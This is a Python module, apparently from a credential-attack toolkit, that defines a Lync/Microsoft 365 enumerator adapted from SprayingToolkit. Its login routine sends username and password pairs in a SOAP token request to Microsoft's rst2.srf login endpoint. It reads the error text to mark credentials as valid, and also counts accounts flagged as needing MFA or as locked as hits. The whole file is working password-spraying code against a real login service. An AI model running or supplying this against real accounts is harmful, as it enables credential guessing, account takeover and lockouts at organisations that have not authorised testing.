import os
from datetime import datetime, timedelta

import requests
import xmltodict

from db.enums.errors import AadError
from enumerators.interfaces.enumerator import VpnEnumerator
import urllib.parse as urlparse

from utils.utils import logfile, get_project_root, SimpleUTC, error, debug, res_to_json


# Disclaimer
# The code for the Lynk enumerator has been copied and adapted from SprayingToolkit
# https://github.com/byt3bl33d3r/SprayingToolkit/blob/master/core/sprayers/lynk.py
# CREDIT: @byt3bl33d3r

class Lync365Enumerator(VpnEnumerator):
    def __init__(self, target, group=None):
        super().__init__()
        self.urls = [f"https://login.microsoftonline.com"]

    def validate(self) -> tuple:
        return None, None

    def login(self, username, password) -> tuple:
        url = f"{self.target}/rst2.srf"
        data = Lync365Enumerator.soap_envelop(username, password)
        self.session.headers["Content-Type"] = "application/soap+xml; charset=utf-8"
        res = self.session.post(url, data=data)
        dict_data = xmltodict.parse(res.content)
        err = None
        try:
            label = dict_data.get(
                "S:Envelope",        {}).get(
                "S:Body",            {}).get(
                "S:Fault",           {}).get(
                "S:Detail",          {}).get(
                "psf:error",         {}).get(
                "psf:internalerror", {}).get(
                "psf:text",          "").split(":")[0]
            err = AadError.from_str(label)
        except:
            pass
        if not err:
            return True, res
        if err == AadError.MFA_NEEDED:
            error(f"{username} need MFA")
            return True, res
        elif err == AadError.LOCKED:
            error(f"{username} is locked")
            return True, res
        return False, res

    @staticmethod
    def soap_envelop(username, password):
        utc_times = [
            datetime.utcnow().replace(tzinfo=SimpleUTC()).isoformat(),
            (datetime.utcnow() + timedelta(days=1)).replace(tzinfo=SimpleUTC()).isoformat()
        ]
        return f"""<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
    <S:Header>
    <wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
    <wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To>
    <ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo">
        <ps:BinaryVersion>5</ps:BinaryVersion>
        <ps:HostingApp>Managed IDCRL</ps:HostingApp>
    </ps:AuthInfo>
    <wsse:Security>
    <wsse:UsernameToken wsu:Id="user">
        <wsse:Username>{username}</wsse:Username>
        <wsse:Password>{password}</wsse:Password>
    </wsse:UsernameToken>
    <wsu:Timestamp Id="Timestamp">
        <wsu:Created>{utc_times[0].replace('+00:00', '1Z')}</wsu:Created>
        <wsu:Expires>{utc_times[1].replace('+00:00', '1Z')}</wsu:Expires>
    </wsu:Timestamp>
</wsse:Security>
    </S:Header>
    <S:Body>
    <wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0">
        <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
        <wsp:AppliesTo>
        <wsa:EndpointReference>
            <wsa:Address>online.lync.com</wsa:Address>
        </wsa:EndpointReference>
        </wsp:AppliesTo>
        <wsp:PolicyReference URI="MBI"></wsp:PolicyReference>
    </wst:RequestSecurityToken>
    </S:Body>
</S:Envelope>"""
